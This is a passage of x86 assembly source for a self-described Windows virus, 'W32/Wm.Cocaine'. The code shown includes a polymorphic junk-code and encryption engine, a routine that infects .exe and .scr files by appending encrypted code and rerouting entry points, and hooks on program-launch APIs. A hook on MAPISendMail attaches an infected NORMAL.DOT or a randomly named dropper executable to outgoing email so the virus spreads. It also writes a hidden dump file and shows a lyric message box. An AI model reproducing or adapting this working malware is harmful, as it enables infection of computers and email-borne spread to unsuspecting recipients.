          call one_byte
    @@1:
          pop edi
          ret
   jmpcs  endp

   jmpn   proc
          mov al, 0e9h
          stosb
          mov eax, JMP_MAX
          call random
          inc eax
          mov ecx, eax
          stosd
          jmp _shit
   jmpn   endp

   jmps   proc
          mov eax, JMP_MAX
          call random
          inc eax
          mov ecx, eax
          mov ah, 0ebh
          xchg al, ah
          stosw
          movzx eax, ah
    _shit:
          call random0                           ;ecx bytes of shit
          stosb
          loop _shit
          ret
   jmps   endp

   movr_byte proc
          call gar
          push eax
          call get8free
          jnc @@1
          pop eax
          ret
     @@1:
          push eax
          mov al, 08ah
          jmp _reg_reg
   movr_byte endp

   movr_word proc
          mov al, 66h                             ;word-size prefix
          stosb
   movr_word endp

   movr_dword proc
          call gar
          push eax
          call get32free
          push eax
          mov al, 08bh
     _reg_reg:
          stosb
          pop eax                                 ;destino
          pop edx                                 ;source
          shl eax, 3
          or eax, edx
          or eax, 11000000b
          stosb
          ret
   movr_dword endp

   mov_dword proc
          call get32free
          or al, 0b8h
          stosb
          call random0
          stosd
          ret
   mov_dword endp

   mov_word proc
          mov al, 66h
          stosb
          call get32free
          or al, 0b8h
          stosb
          call random0
          stosw
          ret
   mov_word endp

   mov_byte proc
          call get8free
          jc @@1
          or al, 0b0h
          stosb
          call random0
          stosb
     @@1:
          ret
   mov_byte endp

   one_byte proc
          mov eax, 5
          call random
          lea ebx, [ebp+(ofs one_byte_table-ofs vcode)]
          xlat
          stosb
          ret
   one_byte endp

   inc_dec proc
          call get32free
          add al, 40h
          call random_f
          js @@1
          or al, 01000b                           ;inc/dec
     @@1:
          stosb
          ret
   inc_dec endp

   mov_zs_x proc
          call random0
          mov eax, 0b60fh
          js @@1
          mov ah, 0beh                            ;z/s
     @@1:
          adc ah, 0                               ;16/8
          stosw
          call gar
          push eax
          call get32free
          shl eax, 3
          pop edx
          or eax, edx
          or al, 0c0h
          stosb
          ret
   mov_zs_x endp

   one_byte_table equ this byte
          std
          clc
          cmc
          cld
          std

   crypt_table equ this byte
          db 080h, 030h, 034h                     ;xor
          db 0f6h, 010h, 0f6h                     ;not
          db 080h, 000h, 02ch                     ;add
          db 080h, 028h, 004h                     ;sub

   gtable equ this byte
          dd ofs jmpcn-ofs vcode
          dd ofs jmpcs-ofs vcode
          dd ofs jmpn-ofs vcode
          dd ofs jmps-ofs vcode
          dd ofs one_byte-ofs vcode
          dd ofs push_pop-ofs vcode
          dd ofs push_pop-ofs vcode
          dd ofs push_pop-ofs vcode
          dd ofs push_pop-ofs vcode
          dd ofs inc_dec-ofs vcode
          dd ofs inc_dec-ofs vcode
          dd ofs mov_zs_x-ofs vcode
          dd ofs mov_zs_x-ofs vcode
          dd ofs math_word-ofs vcode
          dd ofs math_word-ofs vcode
          dd ofs movr_word-ofs vcode
          dd ofs movr_word-ofs vcode
          dd ofs mov_word-ofs vcode
          dd ofs mov_word-ofs vcode
          dd ofs movr_byte-ofs vcode
          dd ofs movr_byte-ofs vcode
          dd ofs movr_byte-ofs vcode
          dd ofs math_byte-ofs vcode
          dd ofs math_byte-ofs vcode
          dd ofs math_byte-ofs vcode
          dd ofs mov_byte-ofs vcode
          dd ofs mov_byte-ofs vcode
          dd ofs mov_byte-ofs vcode
          dd ofs math_dword-ofs vcode
          dd ofs math_dword-ofs vcode
          dd ofs math_dword-ofs vcode
          dd ofs math_dword-ofs vcode
          dd ofs math_dword-ofs vcode
          dd ofs math_dword-ofs vcode
          dd ofs mov_dword-ofs vcode
          dd ofs mov_dword-ofs vcode
          dd ofs mov_dword-ofs vcode
          dd ofs mov_dword-ofs vcode
          dd ofs mov_dword-ofs vcode
          dd ofs mov_dword-ofs vcode
          dd ofs movr_dword-ofs vcode
          dd ofs movr_dword-ofs vcode
          dd ofs movr_dword-ofs vcode
          dd ofs movr_dword-ofs vcode
          dd ofs movr_dword-ofs vcode
          dd ofs movr_dword-ofs vcode
          dd ofs lea_dword-ofs vcode
          dd ofs lea_dword-ofs vcode
          dd ofs lea_dword-ofs vcode
          dd ofs lea_dword-ofs vcode
          dd ofs lea_dword-ofs vcode
          dd ofs lea_dword-ofs vcode
          dd ofs mov_dword-ofs vcode
          dd ofs mov_dword-ofs vcode
          dd ofs mov_dword-ofs vcode
          dd ofs mov_dword-ofs vcode
          dd ofs mov_dword-ofs vcode
          dd ofs mov_dword-ofs vcode
          dd ofs movr_dword-ofs vcode
          dd ofs movr_dword-ofs vcode
          dd ofs movr_dword-ofs vcode
          dd ofs movr_dword-ofs vcode
          dd ofs movr_dword-ofs vcode
          dd ofs movr_dword-ofs vcode
          dd ofs lea_dword-ofs vcode
          dd ofs lea_dword-ofs vcode
          dd ofs lea_dword-ofs vcode
          dd ofs lea_dword-ofs vcode
          dd ofs lea_dword-ofs vcode
          dd ofs lea_dword-ofs vcode

   egtable equ this byte                          ;end of in-memory encripted part

   title1 db 'W32/Wm.Cocaine', 0

   text0  db 'Your life burn faster, obey your master...', 0
   text1  db 'Chop your breakfast on a mirror...', 0
   text2  db 'Veins that pump with fear, sucking darkest clear...', 0
   text3  db 'Taste me you will see, more is all you need...', 0
   text4  db 'I will occupy, I will help you die...', 0
   text5  db 'I will run through you, now I rule you too...', 0
   text6  db "Master of Puppets, I'm pulling your strings...", 0

   text_table equ this byte
          dd ofs text0-ofs vcode
          dd ofs text1-ofs vcode
          dd ofs text2-ofs vcode
          dd ofs text3-ofs vcode
          dd ofs text4-ofs vcode
          dd ofs text5-ofs vcode
          dd ofs text6-ofs vcode

   Payload:
          nop                                     ;on/off switch
          sub ecx, ecx
          push ecx
          lea eax, [ebp+(ofs title1-ofs vcode)]
          push eax
          mov eax, 7
          call random
          mov eax, [ebp+(ofs text_table-ofs vcode)+eax*4]
          add eax, ebp
          push eax                                ;silly MessageBox payload
          push ecx
          call [ebp+(ofs _MessageBoxA-ofs vcode)]
          ret

   kernel           db 'KERNEL32', 0
   user             db 'USER32', 0
   mapi             db 'MAPI32', 0

   align 4

   sGetProcAddress  db 'GetProcAddress', 0        ;APIs from kernel32.dll that
   sGetModuleHandle db 'GetModuleHandleA', 0      ;we need
   sCreateProcessA  db 'CreateProcessA', 0
   sCreateFileA     db 'CreateFileA', 0
   sWinExec         db 'WinExec', 0
   sCloseHandle     db 'CloseHandle', 0           ;api names, related to other 2
   sLoadLibraryA    db 'LoadLibraryA', 0
   sFreeLibrary    db 'FreeLibrary', 0
   sCreateFileMappingA db 'CreateFileMappingA', 0
   sMapViewOfFile   db 'MapViewOfFile', 0
   sUnmapViewOfFile db 'UnmapViewOfFile', 0
   sFindFirstFileA  db 'FindFirstFileA', 0
   sFindNextFileA   db 'FindNextFileA', 0
   sFindClose       db 'FindClose', 0
   sSetEndOfFile    db 'SetEndOfFile', 0
   sVirtualAlloc    db 'VirtualAlloc', 0
   sVirtualFree     db 'VirtualFree', 0
   sGetSystemTime   db 'GetSystemTime', 0
   sGetWindowsDirectoryA db 'GetWindowsDirectoryA', 0
   sGetSystemDirectoryA db 'GetSystemDirectoryA', 0
   sGetCurrentDirectoryA db 'GetCurrentDirectoryA', 0
   sSetFileAttributesA db 'SetFileAttributesA', 0
   sSetFileTime     db 'SetFileTime', 0
   sExitProcess     db 'ExitProcess', 0
   sGetCurrentProcess db 'GetCurrentProcess', 0
   sWriteProcessMemory db 'WriteProcessMemory',0
   sWriteFile       db 'WriteFile', 0
   sDeleteFileA     db 'DeleteFileA', 0
   sSleep           db 'Sleep', 0
   sCreateThread    db 'CreateThread', 0
   sGetFileSize     db 'GetFileSize', 0
   sSetFilePointer  db 'SetFilePointer', 0

   sMessageBoxA     db 'MessageBoxA', 0           ;USER32 functionz
   sFindWindowA     db 'FindWindowA', 0
   sPostMessageA    db 'PostMessageA', 0

   sMAPISendMail    db 'MAPISendMail', 0

   ConsultKey proc
          call @@1
     @@1v dd 0
     @@1:
          push 000F003Fh                          ;KEY_ALL_ACCESS
          push 0
          push eax

          push 80000001H
     what_key equ dwo $-4
          call [ebp+(ofs _RegOpenKeyEx-ofs vcode)]
          test eax, eax
          jnz @@0
          call @@3
          dd 0
     @@3:
          mov edx, [esp]
          mov dwo [edx], MAX_PATH
          lea eax, [ebp+(ofs directory-ofs vcode)]
          mov esi, eax
          mov [eax], eax
          push eax
          push 0
          push 0
          call @@4
          db 0
     @@4:
          push dwo [ebp+(ofs @@1v-ofs vcode)]
          call [ebp+(ofs _RegQueryValueEx-ofs vcode)]
          push dwo [ebp+(ofs @@1v-ofs vcode)]
          call [ebp+(ofs _RegCloseKey-ofs vcode)] ;close key
     @@0:
          ret
   ConsultKey endp

   align 4

   k32_names        equ this byte
                    dd (ofs sCreateProcessA-ofs vcode)
                    dd (ofs sCreateFileA-ofs vcode);these are relative pointerz
                    dd (ofs sWinExec-ofs vcode)   ;to namez... zero end list
                    dd (ofs sCloseHandle-ofs vcode)
                    dd (ofs sLoadLibraryA-ofs vcode)
                    dd (ofs sFreeLibrary-ofs vcode)
                    dd (ofs sCreateFileMappingA-ofs vcode)
                    dd (ofs sMapViewOfFile-ofs vcode)
                    dd (ofs sUnmapViewOfFile-ofs vcode)
                    dd (ofs sFindFirstFileA-ofs vcode)
                    dd (ofs sFindNextFileA-ofs vcode)
                    dd (ofs sFindClose-ofs vcode)
                    dd (ofs sSetEndOfFile-ofs vcode)
                    dd (ofs sVirtualAlloc-ofs vcode)
                    dd (ofs sVirtualFree-ofs vcode)
                    dd (ofs sGetSystemTime-ofs vcode)
                    dd (ofs sGetWindowsDirectoryA-ofs vcode)
                    dd (ofs sGetSystemDirectoryA-ofs vcode)
                    dd (ofs sGetCurrentDirectoryA-ofs vcode)
                    dd (ofs sSetFileAttributesA-ofs vcode)
                    dd (ofs sSetFileTime-ofs vcode)
                    dd (ofs sExitProcess-ofs vcode)
                    dd (ofs sGetCurrentProcess-ofs vcode)
                    dd (ofs sWriteProcessMemory-ofs vcode)
                    dd (ofs sWriteFile-ofs vcode)
                    dd (ofs sDeleteFileA-ofs vcode)
                    dd (ofs sSleep-ofs vcode)
                    dd (ofs sCreateThread-ofs vcode)
                    dd (ofs sGetFileSize-ofs vcode)
                    dd (ofs sSetFilePointer-ofs vcode)
                    dd 0
                    dd (ofs sMessageBoxA-ofs vcode)
                    dd (ofs sFindWindowA-ofs vcode)
                    dd (ofs sPostMessageA-ofs vcode)
                    dd 0

   DeleteShitFile proc
          call delta
          mov ebx, [esp+4]
          push 80h
          push ebx
          call [ebp+(ofs _SetFileAttributesA-ofs vcode)]
          test eax, eax
          jz @@1
          push ebx
          call [ebp+(ofs _DeleteFileA-ofs vcode)]
     @@1:
          ret 4
   DeleteShitFile endp

   NewMAPISendMail proc
          push esp                                ;original MAPISendMail
          pushad
          call delta
          lea eax, [ebp+(ofs mapi-ofs vcode)]
          push eax
          call [ebp+(ofs _GetModuleHandle-ofs vcode)]
          lea ecx, [ebp+(ofs sMAPISendMail-ofs vcode)]
          push ecx
          push eax
          call [ebp+(ofs _GetProcAddress-ofs vcode)]
          mov [esp+(8*4)], eax                  ;return address=MAPISendMail

          mov edi, [esp+(12*4)]                 ;MAPI Struct
          cmp dwo [edi.nFileCount], 0             ;file attached?
          jnz @@3
          inc dwo [edi.nFileCount]                ;set 1 attachments

          lea ebx, [ebp+(ofs MF-ofs vcode)]
          mov [edi.lpFiles], ebx
          sub eax, eax
          mov edi, ebx
          mov ecx, 6
          rep stosd                               ;esi=file structure

          call OpenAncev
          jc @@4                                  ;file dont exists, binary send

          call GetTemplateDir

     @@aaa:
          lodsb
          test al, al
          jnz @@aaa

          call @@aab
   ndot   db '\NORMAL.DOT', 0
     @@aab:
          pop edi
          xchg edi, esi

          dec edi
     @@aac:
          lodsb
          stosb
          test al, al                             ;we'll send infected NORMAL.DOT
          jnz @@aac

          lea esi, [ebp+(ofs directory-ofs vcode)]
          push 80h
          push esi
          call [ebp+(ofs _SetFileAttributesA-ofs vcode)]

          test eax, eax
          jz @@4                                  ;file exists?

          mov eax, esi
          mov edx, 'COD'
          jmp @@5
     @@4:

          call CreateDropper

          mov eax, [ebp+(ofs mm_on_off-ofs vcode)]
          push eax                                ;buffer
          mov eax, [ebp+(ofs fsizel-ofs vcode)]
          push eax                                ;size
          lea edi, [ebp+(ofs rbuf-ofs vcode)]
          mov ebx, edi
          call @@111
   shitfile db 'C:\ENIACOC.SYS', 0
     @@111:
          pop esi
     @@111a:
          lodsb
          stosb
          test al, al
          jnz @@111a
          push ebx                                ;name

          mov dwo [ebp+(ofs wd_att-ofs vcode)], 82h
          call WriteDump                          ;hidden dump

          push 00004000h+00008000h
          push 0
          push dwo [ebp+(ofs mm_on_off-ofs vcode)]
          call [ebp+(ofs _VirtualFree-ofs vcode)]

          lea eax, [ebp+(ofs rbuf-ofs vcode)]
          mov edx, 'EXE'
     @@5:
          lea edi, [ebp+(ofs MF-ofs vcode)]
          mov [edi.lpszPathName], eax             ;set file to send
          lea esi, [ebp+(ofs rbuf+MAX_PATH-ofs vcode)]
          mov [edi.lpszFileName], esi
          xchg edi, esi
          mov eax, 8
          call random
          inc eax
          inc eax
          inc eax
          mov ecx, eax
     @@a:
          mov eax, 23
          call random
          add al, 'A'
          stosb
          loop @@a
          mov al, '.'
          stosb
          mov eax, edx
          stosd
     @@3:
          mov dwo [ebp+(ofs mm_on_off-ofs vcode)], 0
          popad
          ret
   NewMAPISendMail endp

   NewCreateProcessA proc
          push esp                                ;new handler for CreateProcessA
          pushad
          call CheckName
          call delta
          mov eax, [ebp+(ofs _CreateProcessA-ofs vcode)]
          mov [esp+(7*4)+4], eax
          popad
          ret
   NewCreateProcessA endp

   RestoreChunkz db FALSE

   NewWinExec proc
          push esp                                ;new handler for WinExec
          pushad
          call CheckName
          call delta
          mov eax, [ebp+(ofs _WinExec-ofs vcode)]
          mov [esp+(7*4)+4], eax
          popad
          ret
   NewWinExec endp

   ProcessDir proc
          pushad
          lea edi, [ebp+(ofs directory-ofs vcode)];edi=dir to process
          add edi, eax                            ;eax=size of dir
          lea esi, [ebp+(ofs FileMask-ofs vcode)]
          movsd
          movsd                                   ;copy *.* mask
          lea eax, [ebp+(ofs find_data-ofs vcode)]
          push eax
          lea eax, [ebp+(ofs directory-ofs vcode)]
          push eax
          call [ebp+(ofs _FindFirstFileA-ofs vcode)]
          inc eax
          jz @@0                                  ;no file found?
          dec eax
          mov [ebp+(ofs search_handle-ofs vcode)], eax
     @@1:
          pushad
          lea esi, [ebp+(ofs directory-ofs vcode)]
          sub eax, eax
          mov edx, esi
     @@3:
          lodsb
          cmp al, '\'                             ;search last slash
          jne @@5
          mov edx, esi                            ;update slash position
     @@5:
          test al, al
          jnz @@3
          lea esi, [ebp+(ofs filename-ofs vcode)]
          mov edi, edx
     @@4:
          lodsb
          cmp al, 'V'
          je @@6
          cmp al, 'v'
          je @@6
          cmp al, '0'
          jb @@4a
          cmp al, '9'
          jbe @@6
     @@4a:
          stosb
          test al, al                             ;copy name to path
          jnz @@4
          mov eax, dwo [edi-4]
          or eax, 202020h
          not eax
          xor eax, not 'exe'
          jz @@7
          xor eax, ((not 'rcs')xor(not 'exe'))
          jnz @@6                                 ;tricky, isnt? :)
     @@7:
          call Infect
     @@6:                                         ;process it
          popad
          lea eax, [ebp+(ofs find_data-ofs vcode)]
          push eax
          mov eax, [ebp+(ofs search_handle-ofs vcode)]
          push eax
          call [ebp+(ofs _FindNextFileA-ofs vcode)]
          test eax, eax                           ;no more files in this dir?
          jne @@1
     @@2:
          push dwo [ebp+(ofs search_handle-ofs vcode)]
          call [ebp+(ofs _FindClose-ofs vcode)]   ;close search
     @@0:
          popad
          ret
   ProcessDir endp

   peh_machine = 4
   peh_nosections = 6
   peh_ntheader = 20
   peh_flags = 22
   peh_initdata = 32
   peh_entrypoint = 40
   peh_imagebase = 52
   peh_imagesize = 80
   peh_chksum = 88
   peh_reloc1 = 160
   peh_reloc2 = 164

   seh_rvasz = 8
   seh_rva = 12
   seh_rawsz = 16
   seh_raw = 20
   seh_attr = 36

   Infect proc                                    ;infect PE filez
          mov eax, [ebp+(ofs seed-ofs vcode)]
          mov [ebp+(ofs pseed-ofs vcode)], eax
          mov ecx, DIV_VALUE
          call set_new_eh
          mov esp,[esp+8]                         ;fix stack
   _remove_seh:
          jmp remove_seh
          db 0EAh
   set_new_eh:
          sub edx, edx
          push dwo fs:[edx]
          mov fs:[edx], esp                       ;set SEH
          mov by [ebp+(ofs inf?-ofs vcode)], dl
          cmp [ebp+(ofs fsizeh-ofs vcode)], edx
          jne _remove_seh                         ;too big?
          mov eax, [ebp+(ofs fsizel-ofs vcode)]
          cmp dwo [ebp+(ofs mm_on_off-ofs vcode)], 0
          jnz @@5                                 ;skip size check for droppers
          test eax, eax
          jz @@5a
          cmp eax, 16*1024
          jbe _remove_seh                         ;smaller than 16kb?
     @@5:
          div ecx
          test edx, edx                           ;padded to 101 boundary?
          jz _remove_seh
     @@5a:
          call MapFile                            ;map file
          mov ecx, eax
          mov ebx, eax
          jecxz _remove_seh                       ;error mapping

          mov [ebp+(ofs map@-ofs vcode)], eax

          cmp wo [ecx], 'ZM'                      ;EXE file?
          jne @@0
          cmp wo [ecx+18h], 40h
          jne @@0
          mov edi, [ecx+3ch]
          add edi, ecx
          mov [ebp+(ofs pe_header-ofs vcode)], edi
          cmp dwo [edi], 'EP'                     ;PE EXE file?
          jne @@0
          cmp wo [edi+peh_machine], 014Ch         ;i386?
          jne @@0
          movzx eax, wo [edi+peh_flags]
          not al
          test eax, 2002h
          jnz @@0                                 ;isnt DLL? is executable?
          mov esi, edi
          movzx ecx, wo [edi+peh_nosections]
          cmp ecx, 3
          jb @@0                                  ;too few sections
          dec ecx
          mov eax, ecx
          shl eax, 3
          shl ecx, 5
          add eax, ecx
          movzx ecx, wo [edi+peh_ntheader]
          add eax, 24
          add eax, ecx                            ;esi=pe header
          add edi, eax                            ;edi=section header

          bt dwo [edi.seh_attr], 6                ;must be init data
          jnc @@0

          pushad
          mov eax, [esi+peh_entrypoint]
          mov [ebp+(ofs old_eip-ofs vcode)], eax  ;copy entrypoint
          mov edi, esi
          movzx ecx, wo [edi+peh_ntheader]
          add ecx, 24
          add edi, ecx                            ;edi=first section header
          mov eax, [edi+seh_rva]
          mov [ebp+(ofs sRVA-ofs vcode)], eax
          mov eax, [edi+seh_rawsz]
          mov [ebp+(ofs RawSize-ofs vcode)], eax  ;set vars for branch_entry

          mov ecx, [esi+132]
          mov eax, [edi+seh_rva]
          add eax, [edi+seh_rvasz]
          mov ebx, [esi+128]
          sub eax, ebx
          jc @@not_in_1st                         ;IT start after end of 1st sec

          cmp ecx, eax
          ja @@set_it
          xchg eax, ecx
          jmp @@set_it
     @@not_in_1st:
          sub ecx, ecx
     @@set_it:
          mov [ebp+(ofs it_size-ofs vcode)], ecx

          push 00000040h
          push 00002000h+00001000h+00100000h
          push 32*1024
          push 0
          call [ebp+(ofs _VirtualAlloc-ofs vcode)]
          mov [ebp+(ofs buffer2-ofs vcode)], eax
          push 00000040h
          push 00002000h+00001000h+00100000h
          push 32*1024
          push 0
          call [ebp+(ofs _VirtualAlloc-ofs vcode)]
          mov [ebp+(ofs buffer1-ofs vcode)], eax  ;alloc 2 bufferz for poly
          mov edi, eax
          mov esi, ebp
          mov ecx, vsize
          rep movsb                               ;init first buffer
          popad

          lea eax, [ebp+(ofs kernel-ofs vcode)]   ;search in kernel32
          mov [ebp+(ofs dll_name-ofs vcode)], eax
          lea eax, [ebp+(ofs sGetProcAddress-ofs vcode)]
          call SearchIT
          push eax                                ;push GetProcAdress
          lea eax, [ebp+(ofs sGetModuleHandle-ofs vcode)]
          call SearchIT
          push eax                                ;push GetModuleHandleA
          lea eax, [ebp+(ofs sCreateProcessA-ofs vcode)]
          call SearchIT
          push eax                                ;push CreateProcessA
          lea eax, [ebp+(ofs sWinExec-ofs vcode)]
          call SearchIT
          push eax                                ;push WinExec

          lea eax, [ebp+(ofs mapi-ofs vcode)]     ;search in mapi32
          mov [ebp+(ofs dll_name-ofs vcode)], eax
          lea eax, [ebp+(ofs sMAPISendMail-ofs vcode)]
          call SearchIT
          push eax                                ;push MAPISendMail

          sub ecx, ecx
          mov edx, [edi+seh_rva]
          add edx, [edi+seh_rawsz]                       ;rva+raw size=ep
          mov [ebp+(ofs ep-ofs vcode)], edx
          mov ecx, [esi+peh_imagebase]
          add edx, ecx                            ;ep+base=delta run
          mov eax, [esi+peh_entrypoint]

          mov esi, [ebp+(ofs buffer1-ofs vcode)]
          mov edi, [ebp+(ofs buffer2-ofs vcode)]

          mov [esi+(ofs _delta-ofs vcode)], edx   ;set delta in copy
          mov [esi+(ofs _base-ofs vcode)], ecx
          sub eax, [ebp+(ofs ep-ofs vcode)]
          sub eax, 4+(ofs host_entry-ofs vcode)
          mov [esi+(ofs host_entry-ofs vcode)], eax ;set entrypoint in copy

          pop eax
          mov [esi+(ofs OldMAPISendMail-ofs vcode)], eax
          pop eax
          mov [esi+(ofs OldWinExec-ofs vcode)], eax
          pop eax
          mov [esi+(ofs OldCreateProcessA-ofs vcode)], eax
          pop eax
          mov [esi+(ofs OldGetModuleHandleA-ofs vcode)], eax
          pop eax
          mov [esi+(ofs OldGetProcAddress-ofs vcode)], eax

          mov by [esi+(ofs RestoreChunkz-ofs vcode)], FALSE
          cmp dwo [ebp+(ofs RawSize-ofs vcode)], MIN_RAW
          jb @@a

          pushad

          lea edi, [esi+(ofs rbuf-ofs vcode)]     ;start of restoration table
          push edi
          mov ecx, (MAX_BRANCH*(128+4+4))/4
     @@be0:
          call random0                            ;fill buffer with garbage
          stosd
          loop @@be0

          sub eax, eax
          mov [ebp+(ofs reg32-ofs vcode)], eax    ;init internal vars
          mov [ebp+(ofs lparm-ofs vcode)], eax
          mov [ebp+(ofs lvars-ofs vcode)], eax
          mov [ebp+(ofs subs_index-ofs vcode)], eax
          mov [ebp+(ofs s_into-ofs vcode)], eax   ;allow call

          mov by [ebp+(ofs recurse-ofs vcode)], MAX_RECURSION-2
          pop edi

          mov eax, [ebp+(ofs old_eip-ofs vcode)]  ;first chunk at
          sub ecx, ecx                            ;counter
     @@be1:
          inc ecx                                 ;chunk count
          stosd                                   ;starting RVA
          stosd                                   ;(make space for size)
          call virtual2physical_
          or eax, eax
          jz @@fux0red
          mov esi, eax
          add esi, [ebp+(ofs map@-ofs vcode)]

          push ecx
          mov ecx, 128
          push esi edi
          rep movsb                               ;copy bytes at chunk
          pop esi edi
          pop ecx

          lea ebx, [edi-5]
          call crypt_poly
          call garble                             ;make junk
          call crypt_poly
          mov [esi-4], edi                        ;(destine
          sub [esi-4], ebx                        ;- previous destine(b4 junk))
                                                  ;==size
          mov al, 0e9h
          stosd
          stosb                                   ;make JMP

          pushad                                  ;choose a suitable EIP for next
     @@ce0:                                       ;chunk(not overlapping)
          mov eax, [ebp+(ofs RawSize-ofs vcode)]
          sub eax, 12345678h
     it_size equ dwo $-4
          call random
          add eax, [ebp+(ofs sRVA-ofs vcode)]      ;eip=rnd(rva)+base
          sub edx, edx
          sub ebx, ebx                    ;init ok_counter,checked_counter
          lea edi, [ebp+(ofs rbuf-ofs vcode)]
     @@ce1:
          mov esi, [edi]
          add esi, [edi+4]                ;entrypoint is above the end(point+sz)
          cmp eax, esi                    ;last one, so, is valid(for dis entry)
          ja @@ce3
          mov esi, [edi]                  ;entrypoint is below current one - 129
          sub esi, 129                    ;so, it have enought room to grown, ok
          cmp eax, esi
          jnb @@ce2
     @@ce3:
          inc edx                         ;this one is ok
     @@ce2:
          add edi, [edi+4]                ;update pointer to next chunk info
          add edi, 4*2
          inc ebx

          cmp ecx, ebx                    ;all entries checked? no, continue
          jne @@ce1

          cmp ecx, edx                    ;eip allowed for all our entries?
          jne @@ce0

          mov [esp+(7*4)], eax            ;fix eax(stack)
          popad

          push eax

          call virtual2physical_
          add eax, [ebp+(ofs map@-ofs vcode)]
          mov ebx, edi
          sub eax, ebx                            ;calc distance between chunks
          mov [edi-4], eax                        ;patch JMP
          lea eax, [edi-4]                        ;last patcheable jump
          sub eax, [ebp+(ofs map@-ofs vcode)]
          mov [ebp+(ofs patch_jump-ofs vcode)], eax
          mov edi, esi
          add edi, [edi-4]                        ;edi(table)=edi+2 dwords+junk
                                                  ;(cut excess copied bytes)
          pop eax
          cmp ecx, MAX_BRANCH                     ;process next chunk
          jb @@be1
          popad

          mov by [esi+(ofs RestoreChunkz-ofs vcode)], TRUE

     @@a:
          pushad
          mov edi, esi
          mov eax, [ebp+(ofs key1-ofs vcode)]
          mov ecx, (ofs dec_end_code-ofs vcode)/4
     @@loop1:
          xor [edi], eax                          ;do 2nd loop(internal)
          scasd
          add eax, [ebp+(ofs key2-ofs vcode)]
          loop @@loop1
          popad
          mov eax, (ofs DecriptInit-ofs vcode)    ;where our code get control
          mov ecx, vsize
          call mutate                             ;encript
          mov by [ebp+(ofs inf?-ofs vcode)], -1   ;set continue infecting
          mov [ebp+(ofs polybuffer-ofs vcode)], edi
          add [ebp+(ofs ep-ofs vcode)], eax       ;add poly entry to file entry
          cmp ecx, msize                          ;if poly decriptorz dont fill
          jnb @@3                                 ;bufferz, make it bufsize long
          mov ecx, msize
     @@3:
          mov [ebp+(ofs tamanho-ofs vcode)], ecx
     @@0:
          call UnmapFile
     @@1:
          movzx eax, by [ebp+(ofs inf?-ofs vcode)]
          or eax, eax
          mov by [ebp+(ofs inf?-ofs vcode)], 0    ;continue processing?
          jz remove_seh
          mov eax, [ebp+(ofs tamanho-ofs vcode)]
          add eax, [ebp+(ofs fsizel-ofs vcode)]
          call AlignD                             ;round mapsize to infected
          mov [ebp+(ofs fsizel-ofs vcode)], eax   ;mark
          call MapFile
          or eax, eax                             ;error mapping(all is fux0red)
          jz @@1
          mov ebx, eax
          mov [ebp+(ofs map@-ofs vcode)], eax
          add eax, [eax+3ch]
          mov esi, eax
          mov edi, eax
          mov [ebp+(ofs pe_header-ofs vcode)], edi
          movzx ecx, wo [esi+peh_nosections]
          dec ecx
          mov eax, ecx
          shl eax, 3
          shl ecx, 5
          add eax, ecx
          movzx ecx, wo [esi+peh_ntheader]
          add eax, ecx
          sub ecx, ecx                            ;esi=pe header
          add eax, 24                             ;ebx=map base
          add edi, eax                            ;edi=last section header

          mov [esi+peh_reloc1], ecx
          mov [esi+peh_reloc2], ecx               ;no more relocz

          push edi esi

          xchg edi, esi
          mov edi, [esi+seh_raw]
          add edi, [esi+seh_rawsz]
          cmp dwo [ebp+(ofs RawSize-ofs vcode)], MIN_RAW
          jb @@11

          pushad
          mov edi, [ebp+(ofs patch_jump-ofs vcode)]
          mov eax, edi
          add edi, ebx
          call physical2virtual_                  ;get rva of jump immediate
          mov ebx, eax
          mov eax, [ebp+(ofs ep-ofs vcode)]
          sub eax, ebx                            ;sub it from new eip
          sub eax, 4
          mov [edi], eax                          ;patch jmp
          popad

          jmp @@12
     @@11:
          mov eax, [ebp+(ofs ep-ofs vcode)]       ;get new eip
          mov esi, [esp]
          mov [esi+peh_entrypoint], eax           ;set it in pe header
     @@12:
          add edi, ebx                            ;edi=raw ofs+raw sz+mbase
          mov esi, [ebp+(ofs polybuffer-ofs vcode)]
          mov edx, [ebp+(ofs tamanho-ofs vcode)]
          mov ecx, edx
          cld
          rep movsb                               ;zopy vilus codle

          pop esi edi
          mov [esi+peh_chksum], ecx               ;zero checksum
          mov eax, edx
          add eax, [esi+peh_initdata]             ;init data size+vsize
          call AlignF
          mov [esi+peh_initdata], eax
          mov [edi+seh_attr], 80000000h+40000000h+00000040h

          ;NT COMPATIBILITY ZONE
          ;all to make pe infection NT compliant is here
          ;hehe... you also must get the APIs right, of course
          push dwo [ebp+(ofs fsizel-ofs vcode)]
          push ebx
          mov eax, [edi+seh_rawsz]
          mov ebx, [edi+seh_rvasz]
   ;       mov edx, [ebp+(ofs tamanho-ofs vcode)]
          add eax, edx
          add ebx, edx                            ;increase raw/virtual size
          call AlignF
          mov [edi+seh_rawsz], eax                ;save aligned raw size
          xchg eax, ebx
          call AlignO                             ;align virtual size
          cmp eax, ebx
          jnb @@4                                 ;is below raw size?
          mov eax, ebx
          call AlignO                             ;then use raw size, realigned
     @@4:
          mov [edi+seh_rvasz], eax                ;save aligned virtual size
          mov eax, [edi+seh_rvasz]                ;calculate last memory occuped
          add eax, [edi+seh_rva]
          call AlignO                             ;align
          cmp eax, [esi+peh_imagesize]            ;is bigger than previous one?
          jb @@aa
          mov [esi+peh_imagesize], eax            ;if so, fix imagesize
     @@aa:

          call ChecksumMappedFile
          mov [esi+peh_chksum], eax

          push 00004000h+00008000h
          push 0
          push dwo [ebp+(ofs buffer1-ofs vcode)]
          call [ebp+(ofs _VirtualFree-ofs vcode)]
          push 00004000h+00008000h
          push 0
          push dwo [ebp+(ofs buffer2-ofs vcode)]
          call [ebp+(ofs _VirtualFree-ofs vcode)] ;free bufferz
          mov by [ebp+(ofs inf?-ofs vcode)], 0
          jmp @@0

     @@fux0red:
          popad
          jmp @@a

   wavp db 'AVP Monitor',0                        ;inserted in middle of code ;)

     remove_seh:
          sub edx, edx
          pop dwo fs:[edx]                        ;remove frame
          pop edx
          ret
   Infect endp

   AlignD proc
          push ebp edx
          mov ebp, DIV_VALUE
          jmp _align
   AlignD endp

   AlignO proc
          push ebp edx
          mov ebp, [esi+56]
          jmp _align
   AlignO endp

   AlignF proc
          push ebp edx
          mov ebp, [esi+60]
     _align:
          sub edx, edx
          div ebp
          test edx, edx
          jz @@1
          inc eax
          sub edx, edx
     @@1:
          mul ebp
          pop edx ebp
          ret
   AlignF endp

   WriteMem proc
          push 0                                  ;result
          push ecx                                ;size
          push esi                                ;buffer from
          push edi                                ;where write
          call [ebp+(ofs _GetCurrentProcess-ofs vcode)]
          push eax                                ;handle to process
          call [ebp+(ofs _WriteProcessMemory-ofs vcode)]
          ret
